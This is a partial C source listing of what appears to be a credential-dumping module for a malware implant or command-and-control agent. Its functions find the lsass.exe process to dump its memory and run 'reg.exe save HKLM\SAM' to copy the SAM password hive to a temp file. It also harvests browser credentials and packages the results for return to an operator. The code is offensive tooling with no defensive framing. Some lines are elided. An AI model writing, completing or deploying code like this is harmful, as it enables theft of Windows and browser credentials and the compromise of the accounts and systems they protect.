...
static int dump_lsass(uint32_t pid, ark_credential *cred) {
    if (!pid) pid = ark_mod_find_pid("lsass.exe");
    if (!pid) return 0;
...
static int dump_sam(ark_credential *cred) {
    char cmd[] = "reg.exe save HKLM\\SAM %TEMP%\\sam.save /y";
    char *so = NULL, *se = NULL;
    int32_t code = 1;
    int ok = ark_mod_run_cmd(cmd, &so, &se, &code) && code == 0;
    if (ok) {
...
static int dump_browser(ark_credential *cred) {
    char path[MAX_PATH];
...
int ark_mod_creds_dump(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    ...
    if (!ark_pb_decode_cred_dump_config(config, config_len, &cfg)) return 0;
    ...
    if (!ok) return 0;
    return ark_pb_encode_cred_dump_result(cfg.method, &cred, 1, out, out_len);
}